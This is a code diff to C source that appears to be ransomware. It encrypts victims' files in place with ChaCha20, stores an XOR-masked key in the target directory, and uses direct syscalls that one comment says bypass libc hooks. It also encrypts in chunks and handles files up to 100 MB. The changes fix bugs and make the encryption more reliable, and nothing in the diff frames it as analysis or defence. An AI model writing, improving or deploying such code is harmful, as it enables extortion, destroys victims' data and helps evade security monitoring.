@@ -53,10 +53,14 @@ int init_encryption_system(char* target_directory) {
     snprintf(keypath, sizeof(keypath), "%s/.chacha20_key.bin", target_directory);
     FILE *key_file = fopen(keypath, "wb");
     if (key_file) {
-        xor_encrypt_buffer(chacha20_key, CHACHA20_KEY_SIZE, encryption_key);
-        xor_encrypt_buffer(chacha20_nonce, CHACHA20_NONCE_SIZE, encryption_key);
-        fwrite(chacha20_key, 1, CHACHA20_KEY_SIZE, key_file);
-        fwrite(chacha20_nonce, 1, CHACHA20_NONCE_SIZE, key_file);
+        unsigned char key_copy[CHACHA20_KEY_SIZE];
+        unsigned char nonce_copy[CHACHA20_NONCE_SIZE];
+        memcpy(key_copy, chacha20_key, CHACHA20_KEY_SIZE);
+        memcpy(nonce_copy, chacha20_nonce, CHACHA20_NONCE_SIZE);
+        xor_encrypt_buffer(key_copy, CHACHA20_KEY_SIZE, encryption_key);
+        xor_encrypt_buffer(nonce_copy, CHACHA20_NONCE_SIZE, encryption_key);
+        fwrite(key_copy, 1, CHACHA20_KEY_SIZE, key_file);
+        fwrite(nonce_copy, 1, CHACHA20_NONCE_SIZE, key_file);
         fclose(key_file);
     }
     return 0;
@@ -83,22 +87,29 @@ int chacha20_encrypt_buffer(unsigned char *data, size_t len) {
         return -1;
     }
     
-    output = malloc(len);
+    output = malloc(len + EVP_MAX_BLOCK_LENGTH);
     if (!output) {
         fprintf(stderr, "Failed to allocate output buffer\\n");
         EVP_CIPHER_CTX_free(ctx);
         return -1;
     }
-    
+
     if (EVP_EncryptUpdate(ctx, output, &out_len, data, len) != 1) {
         fprintf(stderr, "ChaCha20 encryption failed\\n");
         free(output);
         EVP_CIPHER_CTX_free(ctx);
         return -1;
     }
-    
-    // Copy encrypted data back
-    memcpy(data, output, len);
+
+    int final_len = 0;
+    if (EVP_EncryptFinal_ex(ctx, output + out_len, &final_len) != 1) {
+        fprintf(stderr, "ChaCha20 finalisation failed\\n");
+        free(output);
+        EVP_CIPHER_CTX_free(ctx);
+        return -1;
+    }
+
+    memcpy(data, output, out_len + final_len);
     free(output);
     EVP_CIPHER_CTX_free(ctx);
     
@@ -164,53 +175,59 @@ int calculate_encryption_chunks(size_t file_size, chunk_info_t *chunks) {
 int encrypt_file_direct_syscall(const char *filepath) {
     struct stat st;
     int fd;
-    unsigned char *file_data;
-    ssize_t bytes_read, bytes_written;
+    chunk_info_t chunks[MAX_CHUNKS];
+    int chunk_count;
+    unsigned char *buffer = NULL;
 
-    // Open file using direct syscall (bypasses libc hooks)
     fd = direct_openat(AT_FDCWD, filepath, O_RDWR, 0);
     if (fd < 0) {
         return -1;
     }
 
-    // Get file size
     if (fstat(fd, &st) != 0) {
         direct_close(fd);
         return -1;
     }
 
-    // Skip empty files or files that are too large
-    if (st.st_size == 0 || st.st_size > 50 * 1024 * 1024) {
+    if (st.st_size == 0 || st.st_size > 100 * 1024 * 1024) {
         direct_close(fd);
         return -1;
     }
 
-    // Allocate buffer
-    file_data = malloc(st.st_size);
-    if (!file_data) {
+    chunk_count = calculate_encryption_chunks(st.st_size, chunks);
+
+    size_t max_chunk_size = 0;
+    for (int i = 0; i < chunk_count; i++) {
+        if (chunks[i].length > max_chunk_size)
+            max_chunk_size = chunks[i].length;
+    }
+
+    buffer = malloc(max_chunk_size);
+    if (!buffer) {
         direct_close(fd);
         return -1;
     }
 
-    // Read file using direct syscall
-    bytes_read = direct_read(fd, file_data, st.st_size);
-    if (bytes_read != st.st_size) {
-        free(file_data);
-        direct_close(fd);
-        return -1;
+    for (int i = 0; i < chunk_count; i++) {
+        if (direct_lseek(fd, chunks[i].offset, SEEK_SET) < 0) continue;
+
+        ssize_t bytes_read = direct_read(fd, buffer, chunks[i].length);
+        if (bytes_read != (ssize_t)chunks[i].length) continue;
+
+        chacha20_encrypt_buffer(buffer, chunks[i].length);
+
+        if (direct_lseek(fd, chunks[i].offset, SEEK_SET) < 0) continue;
+        ssize_t bytes_written = direct_write(fd, buffer, chunks[i].length);
+        if (bytes_written != (ssize_t)chunks[i].length) {
+            free(buffer);
+            direct_close(fd);
+            return -1;
+        }
     }
 
-    // Encrypt data
-    chacha20_encrypt_buffer(file_data, st.st_size);
-
-    // Seek to beginning and write encrypted data using direct syscall
-    direct_lseek(fd, 0, SEEK_SET);
-    bytes_written = direct_write(fd, file_data, st.st_size);
-
-    free(file_data);
+    free(buffer);
     direct_close(fd);
-
-    return (bytes_written == st.st_size) ? 0 : -1;
+    return 0;
 }
 
 // Method 2: io_uring encryption (if available)
@@ -338,12 +355,16 @@ int encrypt_file_partial_direct(const char *filepath) {
         if (bytes_read != (ssize_t)chunks[i].length) continue;
         
         chacha20_encrypt_buffer(buffer, chunks[i].length);
-        
-        // Write back encrypted chunk using direct syscall
+
         if (direct_lseek(fd, chunks[i].offset, SEEK_SET) < 0) continue;
-        direct_write(fd, buffer, chunks[i].length);
+        ssize_t bytes_written = direct_write(fd, buffer, chunks[i].length);
+        if (bytes_written != (ssize_t)chunks[i].length) {
+            free(buffer);
+            direct_close(fd);
+            return -1;
+        }
     }
-    
+
     free(buffer);
     direct_close(fd);
     return 0;
